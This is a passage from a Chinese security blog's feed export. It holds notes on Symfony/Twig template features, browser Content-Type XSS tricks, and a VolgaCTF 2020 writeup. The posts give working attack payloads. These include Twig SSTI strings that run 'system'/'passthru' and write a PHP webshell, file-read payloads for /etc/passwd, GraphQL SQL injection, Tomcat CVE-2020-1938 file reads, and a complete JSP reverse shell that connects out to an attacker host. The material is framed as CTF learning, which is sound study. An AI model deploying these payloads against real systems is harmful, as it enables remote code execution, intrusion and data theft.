和cookies方法都和这两个一样</h3><ul><li><p>req.request.attributes</p></li><li><p>req.request.cookies</p></li></ul><h3 id="files"><a href="#files" class="headerlink" title="files"></a>files</h3><p><img src="../../../../../../../images/symfony/app-files.png" alt="pic"></p><p>可以看到 <code>FileBag extends ParameterBag</code></p><p>因此拥有上面一样的方法</p><p>同时上传的文件是<code>UploadedFile</code> 的实例</p><p>因此使用 <code>get</code>来获取上传的文件，可以使用<code>UploadFile</code>的方法</p><p>查看<code>UploadedFile.php</code> 的方法</p><p>没啥有用的感觉，应该就一个 <code>move</code> 可以任意文件上传吧</p><p><img src="../../../../../../../images/symfony/upload-move.png" alt="pic"></p><p>可以看到有两个参数，目录和名字</p><p>有写权限到任意位置</p><p>可以指定第二个参数为文件名，没有就是临时文件名</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>是环境变量的内容</p><p>看介绍：</p><p><strong>ServerBag is a container for HTTP headers from the $_SERVER variable.</strong></p><p>依然是 <code>extends ParameterBag</code></p><p>还是和上面类似，多了一个<code>getHeaders()</code></p><p>还是直接 <code>app.request.server.all()</code>简单粗暴</p><p>可以<code>set()</code>可以设置，但是没想到有什么用</p><h3 id="headers"><a href="#headers" class="headerlink" title="headers"></a>headers</h3><pre><code>app.request.headers </code></pre><p>这个看了下</p><h2 id="Twig-模板渲染简单学习"><a href="#Twig-模板渲染简单学习" class="headerlink" title="Twig 模板渲染简单学习"></a>Twig 模板渲染简单学习</h2><h3 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h3><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code>{% for i in 0..10%}1{%endfor%}</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code>{% if 1==1 %}1{%endif%}</code></pre><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><pre><code>{% include 'twigi/inc.twig' %}包含多个{% include ['1.html', '2.html'] %}</code></pre><p>如果有字数限制应该可以考虑<code>include</code></p><p>只能是 <code>templates</code>目录下的</p><h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>启动熟悉的<code>sandbox</code>模式</p><pre><code>{% sandbox %}{% include '1.html' %}{% endsandbox %}</code></pre><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><pre><code>{% set foo = 'bar' %}</code></pre><h3 id="filter-重要的来了"><a href="#filter-重要的来了" class="headerlink" title="filter 重要的来了"></a>filter 重要的来了</h3><h4 id="convert-encoding"><a href="#convert-encoding" class="headerlink" title="convert_encoding"></a>convert_encoding</h4><p>从编码字符串转换到另外一种编码</p><pre><code>{{ 'a<sddsa>'|convert_encoding('UTF-8', 'utf-16be') }}</sddsa></code></pre><h4 id="escape转义"><a href="#escape转义" class="headerlink" title="escape转义"></a>escape转义</h4><pre><code>{{'da"'|escape}}</code></pre><p>为了方便用<code>e</code>作为别名</p><p>可以<code>escape</code>多种格式</p><ul><li><p>html默认</p><pre><code>{{'da"'|e('html')}} da&amp;quot; </code></pre></li><li><p>js</p><pre><code>{{'da"'|e('js')}}da\u0022 </code></pre></li><li><p>css</p></li></ul><pre><code>{{'da"'|e('css')}}da\22 </code></pre><ul><li>url</li></ul><pre><code>{{'da"'|e('url')}}da%22 </code></pre><ul><li>还有个html_attr</li></ul><p>转义HTML属性字符串</p><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>选择元素</p><pre><code>{{[1,2,3,4,5,6,7]|filter(i=&gt;i&gt;2)|join('')}}3,4,5,6,7 </code></pre><p>这个也可以传入 <code>function</code> ，也是可以函数执行 getshell的</p><h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>返回第一个数组，<code>{}</code>,字符串 的内容</p><pre><code>{{ [1, 2, 3, 4]|first }} \\1{{ { a: 1, b: 2, c: 3, d: 4 }|first }} \\1{{ '1234'|first }} \\1</code></pre><h4 id="last-和first对应"><a href="#last-和first对应" class="headerlink" title="last 和first对应"></a>last 和first对应</h4><h4 id="format-占位符号"><a href="#format-占位符号" class="headerlink" title="format 占位符号"></a>format 占位符号</h4><pre><code>{{'南梦师傅 %s'|format('tql')}}南梦师傅 tql </code></pre><h4 id="join-拼接成字符串"><a href="#join-拼接成字符串" class="headerlink" title="join 拼接成字符串"></a>join 拼接成字符串</h4><pre><code>{{ [1, 2, 3]|join }}123</code></pre><h4 id="json-encode-就是使用这个函数"><a href="#json-encode-就是使用这个函数" class="headerlink" title="json_encode 就是使用这个函数"></a>json_encode 就是使用这个函数</h4><pre><code>{{ {a:1}|json_encode()}}{&amp;quot;a&amp;quot;:1}{{ 123|json_encode()}}123 </code></pre><h4 id="keys-获取数组的键名"><a href="#keys-获取数组的键名" class="headerlink" title="keys 获取数组的键名"></a>keys 获取数组的键名</h4><pre><code>{{ {a:1,b:2,c:3}|keys|join(',') }}a,b,c{{ [1,2,3,4]|keys|join(',') }}0,1,2,3</code></pre><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><pre><code>{{ 'das'|length}} //3</code></pre><h4 id="lower-和-upper"><a href="#lower-和-upper" class="headerlink" title="lower 和 upper"></a>lower 和 upper</h4><pre><code>{{ 'das'|lower}}{{ 'das'|upper}}</code></pre><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>就是数组内的映射的筛选</p><pre><code>{{[{a:1,b:2},{a:3,b:4}]|map(i=&gt; "#{i.a}")|join('') }}</code></pre><p>得到 <code>13</code></p><p><code>"{i.a}"</code> 这个引号需要是 双引号</p><p>更有用的一点是，允许用户传一个<code>function</code></p><p>可以是 <code>system</code> ，<code>passthru</code>，<code>exec</code> ,<code>popen</code>,</p><p><code>shell_exec</code> ，<code>file_put_contents</code>等等</p><p>那样就可以任意函数执行了</p><h4 id="merge-和php的一样"><a href="#merge-和php的一样" class="headerlink" title="merge 和php的一样"></a>merge 和php的一样</h4><p>数组合并</p><pre><code>{{ [1,2]|merge([3,4])|join(',')}}1,2,3,4</code></pre><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><pre><code>{{"abcdef "|replace({'a':'first','e':'haha'})}}firstbcdhahaf </code></pre><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><pre><code>{{"abcdef "|reverse}}fedcba </code></pre><h4 id="slice-切片"><a href="#slice-切片" class="headerlink" title="slice 切片"></a>slice 切片</h4><pre><code>{{'123'|slice(1,2)}} //23{{'123'[1:2]}} //23</code></pre><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><pre><code>{{ '1,2,3'|split(',') }}</code></pre><h4 id="striptags-去除标签"><a href="#striptags-去除标签" class="headerlink" title="striptags 去除标签"></a>striptags 去除标签</h4><pre><code>{{'<asd>asd'|striptags}} //asd</asd></code></pre><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>略</p><h4 id="url-encode"><a href="#url-encode" class="headerlink" title="url_encode"></a>url_encode</h4><pre><code>{{'<asd>asd'|url_encode}}%3Casd%3Easd </asd></code></pre><h3 id="function"><a href="#function" class="headerlink" title="function"></a>function</h3><h4 id="attribute-访问object方法"><a href="#attribute-访问object方法" class="headerlink" title="attribute 访问object方法"></a>attribute 访问object方法</h4><p><strong>还可以设置第三个参数，传递的变量</strong></p><p>可以访问 <code>object</code>的属性</p><p><strong>获取http请求</strong></p><pre><code>{{attribute(app,'request')}}</code></pre><p>获取<code>session</code></p><pre><code>{{ attribute(app,'session')|join('')}}</code></pre><p>当前程序环境的名称</p><pre><code>{{ attribute(app,'environment')}} //dev</code></pre><p>还有其他的方法，只是举个例子</p><h4 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include</h4><p>包含模板渲染的内容</p><p>可以传递变量</p><pre><code>{{ include('template.html', {foo: 'bar'}) }}</code></pre><h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p>就是python那个</p><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>twig 读取模板的内容 限定在 templates</p><pre><code>{{ source('twigi/index.html.twig')}}</code></pre><h2 id="twig-和symfony"><a href="#twig-和symfony" class="headerlink" title="twig 和symfony"></a>twig 和symfony</h2><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><pre><code>第一个是路由，可以模板渲染{{ render('twig2hhh') }}{{ render('twig2hhh', options = []) }}</code></pre><h3 id="csrf-token-生成csrf-token"><a href="#csrf-token-生成csrf-token" class="headerlink" title="csrf_token 生成csrf token"></a>csrf_token 生成csrf token</h3><pre><code>{{csrf_token('asd')}}</code></pre><h3 id="humanize-人好看的形式"><a href="#humanize-人好看的形式" class="headerlink" title="humanize 人好看的形式"></a>humanize 人好看的形式</h3><pre><code>{{'adas'|humanize}} // Adas</code></pre><h3 id="file-excerpt-读取文件"><a href="#file-excerpt-读取文件" class="headerlink" title="file_excerpt 读取文件"></a>file_excerpt 读取文件</h3><pre><code>{{ '/etc/passwd'|file_excerpt(1, -1) }}</code></pre><p>第一个参数是<code>line</code></p><p>第二个参数是在给定行数周围显示多少行</p><p><code>-1</code>代表全部</p><h3 id="format-file"><a href="#format-file" class="headerlink" title="format_file"></a>format_file</h3><p>这个很迷似乎生成一个标签，然后点击就<code>can not open</code></p><p>懒得管了，占个位，用到再说</p><h3 id="file-link"><a href="#file-link" class="headerlink" title="file_link"></a>file_link</h3><p>生成一个链接，还是<code>can not open</code> ，继续占个位置</p><pre><code>{{ '/tmp/111'|file_link(1) }}http://127.0.0.1:8000/_profiler/open?file=/tmp/111&amp;amp;line=1#line1 </code></pre><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>从这次比赛学到了，tqlll</p><h3 id="显示变量"><a href="#显示变量" class="headerlink" title="显示变量"></a>显示变量</h3><p> <code>var_dump</code></p><p>上下文完整变量：</p><pre><code>{{dump()}}</code></pre><p>app 所有变量，不就是上面那个嘛</p><pre><code>{{dump(app)}}</code></pre><p><strong>所有环境变量</strong></p><pre><code>{{app.request.server.all|join(',')}}</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code>注入{{app.request.query.filter(0,0,1024,{'options':'system'})}}并且 GET ?0=cat /etc/passwd</code></pre><p>或者</p><p>这个我试过报错了</p><pre><code>{{['cat${IFS}/etc/passwd']|filter('system')}}</code></pre><p>因为是数组，所以报错，所以应该拼接</p><p><strong>所以正确的应该是</strong></p><pre><code>{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}</code></pre><p>或者</p><pre><code>{{['id']|map('passthru')}}"@aaa.bbb</code></pre><p>或者</p><pre><code>{{["id", 0]|reduce("passthru")}}{{[0, 0]|reduce("system", "id")|join(",")}}</code></pre><p>或者</p><pre><code>{{["id"]|filter('system')}}</code></pre><pre><code>{{["id", 0]|sort("system")|join(",")}}</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p><pre><code>{{app.request.files.get(key}}</code></pre><p>得到的是 临时文件名字</p><p><strong>然后下面是文件写入</strong></p><p>需要使用 multipart 文件上传</p><p>这里的<code>key</code>指的是</p><p>文件上传的<code>field</code>名字 </p><pre><code>{{app.request.files.get(key).move(app.request.query.get(1))}}并且GET 文件目录?1=/tmp/000</code></pre><p>内容如下：</p><pre><code>POST /subscribe?1=/tmp/000 HTTP/1.1Host: 192.168.0.102:8000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.102:8000/subscribe?Content-Type: multipart/form-data; boundary=---------------------------80447652219106375571633636037Content-Length: 78Connection: closeCookie: remember-me=YWRtaW46MTU4NjQyMjc5NDEzMTo3ZDcxMzIyOGY5OTYxYWQxYzJjYmIwM2VjMWYzNTU0ZgUpgrade-Insecure-Requests: 1-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file1"; filename="1234"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="email""{{app.request.files.get('file').move(app.request.query.get(1))}}"@qq.com-----------------------------80447652219106375571633636037--</code></pre><p>文件目录可以的情况下如果没有 <code>/tmp/000</code>，就会创建文件夹</p><p>然后得到的是一个临时文件名</p><p><code>/tmp/000/phpdEjxsR</code></p><p>或者 另外一种</p><pre><code>{{{"<!--?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}</code--></code></pre><h3 id="任意文件读取"><code><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</code></h3><pre><code><code>{{'/etc/passwd'|file_excerpt(1,30)}}{{'/etc/passwd'|file_excerpt(0,-1)}}</code></code></pre><p><code>或者</code></p><code><pre><code>{{app.request.files.get('file').__construct('/etc/passwd','')}}{{app.request.files.get('file').openFile.fread(99)}}</code></pre><p>这两个需要在同一个请求连着一起用，就可以读取 <code>/etc/passwd</code>的内容了，读取<code>99</code>个字节</p><p>用到了 <code>app.request.files</code>的需要</p><p>multipart 的文件上传</p><p>以下成功了：</p><pre><code>POST /subscribe HTTP/1.1Host: 192.168.0.102:8000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.102:8000/subscribe?Content-Type: multipart/form-data; boundary=---------------------------80447652219106375571633636037Content-Length: 78Connection: closeCookie: remember-me=YWRtaW46MTU4NjQyMjc5NDEzMTo3ZDcxMzIyOGY5OTYxYWQxYzJjYmIwM2VjMWYzNTU0ZgUpgrade-Insecure-Requests: 1-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037Content-Disposition: form-data; name="file"; filename="1234"Content-Type: application/octet-streamdasd-----------------------------80447652219106375571633636037</code></pre><p>参考:</p><p><a href="https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md" target="_blank" rel="noopener">https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md</a></p><p><a href="https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel" target="_blank" rel="noopener">https://symfony.com/legacy/doc/jobeet/1_2/cn/01?orm=Propel</a></p><p><a href="https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html" target="_blank" rel="noopener">https://geek-docs.com/php/symfony-tutorial/symfony-tutorial.html</a></p><p><a href="https://twig.symfony.com/doc/3.x/templates.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/templates.html</a></p></code><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Symfony </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>firefox中content-type的XSS</title>
      <link href="/2020/03/31/firefox-content-type-xss/"/>
      <url>/2020/03/31/firefox-content-type-xss/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>知识全靠writeup得到，师傅们tqlllll</p><h2 id="MIME-嗅探"><a href="#MIME-嗅探" class="headerlink" title="MIME 嗅探"></a>MIME 嗅探</h2><p>如果<code>content-type</code>是<code>text-plain</code>或者<code>空</code>的话</p><p>浏览器会根据内容格式来决定使用什么解析</p><p>比如:</p><pre><code>&lt;script&gt;alert()&lt;/script&gt;</code></pre><p>就按照<code>text/html</code>来解析</p><p>要防止<code>MIME</code>嗅探，设置</p><pre><code>X-Content-Type-Options：nosniff</code></pre><h2 id="设置"><a href="#设置" class="headerlink" title="设置 */*"></a>设置 <code>*/*</code></h2><p>表示让firefox 猜测 mime-type ，</p><p>即使设置了 <code>X-Content-Type-Options：nosniff</code></p><p>也可以使用，直接忽略，tqllll</p><p><strong>这个在chrome也可以</strong></p><h2 id="设置text-rdf"><a href="#设置text-rdf" class="headerlink" title="设置text/rdf"></a>设置<code>text/rdf</code></h2><p>然后xss 内容是</p><pre><code>&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><p>本地测试</p><pre><code>&lt;?phpheader('content-type:text/rdf');?&gt;&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><h2 id="设置multipart-x-mixed-replace"><a href="#设置multipart-x-mixed-replace" class="headerlink" title="设置multipart/x-mixed-replace;"></a>设置<code>multipart/x-mixed-replace;</code></h2><p>tqlllll</p><p>irefox 有一个 <code>multipart/x-mixed-replace;</code> 类型</p><p>支持多部分响应</p><p>需要有一个 boundary 来分割</p><p>本地测试：</p><pre><code>&lt;?phpheader('content-type: multipart/x-mixed-replace;boundary="XXMIMEBOUNDARY"');?&gt;--XXMIMEBOUNDARYContent-type: text/html&lt;script&gt;alert()&lt;/script&gt;--XXMIMEBOUNDARY</code></pre><p>例子：</p><pre><code>Content-Type: Multipart/mixed; boundary="sample_boundary";Multipart not supported :(--sample_boundaryContent-Type: text/css; charset=utf-8Content-Location: http://localhost:2080/file.cssbody{ background-color: yellow;}--sample_boundaryContent-Type: application/x-javascript; charset=utf-8Content-Location: http://localhost:2080/file.jsalert("Hello from a javascript!!!");--sample_boundary</code></pre><p>师傅们tttttttttttqqqqqqqqlllllllllllll</p><h2 id="chrome-中的content-type-xss"><a href="#chrome-中的content-type-xss" class="headerlink" title="chrome 中的content-type xss"></a>chrome 中的content-type xss</h2><h3 id="设置-text-xsl"><a href="#设置-text-xsl" class="headerlink" title="设置 text/xsl"></a>设置 <code>text/xsl</code></h3><p>被处理为 xml</p><pre><code>Content-Type: text/xsl&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><h3 id="设置为text-plain-text-html"><a href="#设置为text-plain-text-html" class="headerlink" title="设置为text/plain;,text/html"></a>设置为<code>text/plain;,text/html</code></h3><p>支持多种引号分割</p><pre><code>Content-Type: text/plain;,text/html&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><h2 id="关于-Edge-的content-type-xss"><a href="#关于-Edge-的content-type-xss" class="headerlink" title="关于 Edge 的content-type xss"></a>关于 Edge 的content-type xss</h2><h3 id="设置为text-vtt"><a href="#设置为text-vtt" class="headerlink" title="设置为text/vtt"></a>设置为<code>text/vtt</code></h3><p>被处理为 html</p><pre><code>Content-Type: text/vtt&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF2020 Qualifier部分writeup</title>
      <link href="/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/"/>
      <url>/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，才水了两道题</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>注册登录，看到请求：</p><p>登录的:</p><pre><code>{"query":"query login($input: LoginUser) {\n  login(user: $input) {\n  token login name email \n  }\n}\n","variables":{"input":{"login":"123","password":"123"}}}</code></pre><p>登录后的</p><pre><code>{"query":"query {books{pic \n author }}"}</code></pre><p>是用了<code>graphQL</code></p><p>可以<code>graphQL注入</code></p><pre><code>{"query":"query {__schema {types{ name } mutationType{name}}}"}</code></pre><p>然后得到详细情况</p><pre><code>{"query":"query {  __type(name: \"Query\") { name fields (includeDeprecated: true){ name type { name kind ofType{name kind description}}}}}"}</code></pre><p>看到有一个 <code>testGetUsersByFilter</code></p><p>然后看到它的 <code>oftype</code>等情况</p><p>得到用法，和登录的那个类似</p><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"admin","email":"or","name":"yuewuhen"}}}</code></pre><p>发现可以查询，</p><p>那么尝试是否有<code>mysql</code>或者<code>sqlite</code>等注入点</p><p>FUZZ后发现单引号被过滤了</p><p>那么应该是<code>sql</code>注入，而且查询的情况是使用了<code>or</code>查询</p><p>所以可以考虑用 <code>\\</code> 来注入</p><p>然后<code>FUZZ</code>发现是使用了<code>mysql</code>，而且空格被过滤了</p><p>最后就是简单的mysql注入了：</p><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"order/**/by/**/6;#"}}}</code></pre><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"union/**/select/**/1,(select/**/flag/**/from/**/flag),3,4,5,6#"}}}</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/library.png" alt=""></p><h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>打开是一个 <code>html</code>页面 什么都没有，<code>FUZZ</code>报错发现是</p><p><code>tomcat/9.0.24</code></p><p>前几天刚复现了<code>cve-2020-1938</code> 的<code>tomcat</code>漏洞</p><p>可以任意文件读取，如果有上传甚至可以<code>RCE</code></p><p>猜测<code>webapp</code>叫做<code>NetCorp</code>,</p><p>先查看<code>web.xml</code></p><p>外国的比赛加个 <code>proxychains</code>快点</p><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp WEB-INF/web.xml  netcorp.q.2020.volgactf.ru </code></pre><p>web.xml</p><pre><code>&lt;web-app&gt;  &lt;display-name&gt;NetCorp&lt;/display-name&gt;  &lt;servlet&gt;      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;      &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;      &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;      &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;        &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;        &lt;description&gt;Complaint info&lt;/description&gt;        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;error-page&gt;        &lt;error-code&gt;404&lt;/error-code&gt;        &lt;location&gt;/404.html&lt;/location&gt;    &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>很明显了，查看一下代码</p><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class netcorp.q.2020.volgactf.ru </code></pre><p><strong>代码</strong></p><pre><code>//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package ru.volgactf.netcorp;import java.io.File;import java.io.IOException;import java.io.PrintWriter;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Iterator;import javax.servlet.ServletConfig;import javax.servlet.ServletException;import javax.servlet.annotation.MultipartConfig;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.Part;@MultipartConfigpublic class ServeScreenshotServlet extends HttpServlet {    private static final String SAVE_DIR = "uploads";    public ServeScreenshotServlet() {        System.out.println("ServeScreenshotServlet Constructor called!");    }    public void init(ServletConfig config) throws ServletException {        System.out.println("ServeScreenshotServlet \"Init\" method called");    }    public void destroy() {        System.out.println("ServeScreenshotServlet \"Destroy\" method called");    }    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        String appPath = request.getServletContext().getRealPath("");        String savePath = appPath + "uploads";        File fileSaveDir = new File(savePath);        if (!fileSaveDir.exists()) {            fileSaveDir.mkdir();        }        String submut = request.getParameter("submit");        if (submut != null &amp;&amp; !submut.equals("true")) {        }        Iterator var7 = request.getParts().iterator();        while(var7.hasNext()) {            Part part = (Part)var7.next();            String fileName = this.extractFileName(part);            fileName = (new File(fileName)).getName();            String hashedFileName = this.generateFileName(fileName);            String path = savePath + File.separator + hashedFileName;            if (!path.equals("Error")) {                part.write(path);            }        }        PrintWriter out = response.getWriter();        response.setContentType("application/json");        response.setCharacterEncoding("UTF-8");        out.print(String.format("{'success':'%s'}", "true"));        out.flush();    }    private String generateFileName(String fileName) {        try {            MessageDigest md = MessageDigest.getInstance("MD5");            md.update(fileName.getBytes());            byte[] digest = md.digest();            String s2 = (new BigInteger(1, digest)).toString(16);            StringBuilder sb = new StringBuilder(32);            int i = 0;            for(int count = 32 - s2.length(); i &lt; count; ++i) {                sb.append("0");            }            return sb.append(s2).toString();        } catch (NoSuchAlgorithmException var8) {            var8.printStackTrace();            return "Error";        }    }    private String extractFileName(Part part) {        String contentDisp = part.getHeader("content-disposition");        String[] items = contentDisp.split(";");        String[] var4 = items;        int var5 = items.length;        for(int var6 = 0; var6 &lt; var5; ++var6) {            String s = var4[var6];            if (s.trim().startsWith("filename")) {                return s.substring(s.indexOf("=") + 2, s.length() - 1);            }        }        return "";    }}</code></pre><p>文件名经过<code>md5</code></p><p>那就上传<code>jsp</code>文件，然后<code>rce</code>了</p><pre><code>&lt;%@page import="java.lang.*"%&gt;&lt;%@page import="java.util.*"%&gt;&lt;%@page import="java.io.*"%&gt;&lt;%@page import="java.net.*"%&gt;&lt;%  class StreamConnector extends Thread  {    InputStream zd;    OutputStream fm;    StreamConnector( InputStream zd, OutputStream fm )    {      this.zd = zd;      this.fm = fm;    }    public void run()    {      BufferedReader fr  = null;      BufferedWriter ctw = null;      try      {        fr  = new BufferedReader( new InputStreamReader( this.zd ) );        ctw = new BufferedWriter( new OutputStreamWriter( this.fm ) );        char buffer[] = new char[8192];        int length;        while( ( length = fr.read( buffer, 0, buffer.length ) ) &gt; 0 )        {          ctw.write( buffer, 0, length );          ctw.flush();        }      } catch( Exception e ){}      try      {        if( fr != null )          fr.close();        if( ctw != null )          ctw.close();      } catch( Exception e ){}    }  }  try  {    String ShellPath;if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {  ShellPath = new String("/bin/sh");} else {  ShellPath = new String("cmd.exe");}    Socket socket = new Socket( "ip", 23561 );    Process process = Runtime.getRuntime().exec( ShellPath );    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  } catch( Exception e ) {}%&gt;</code></pre><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  uploads/d17faea05c8d3f2ff9b5f67f6fa0e7a6 netcorp.q.2020.volgactf.ru</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/netcorp.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020新春战役GYCTF writeup</title>
      <link href="/2020/02/24/gyctf2020-writeup/"/>
      <url>/2020/02/24/gyctf2020-writeup/</url>
      
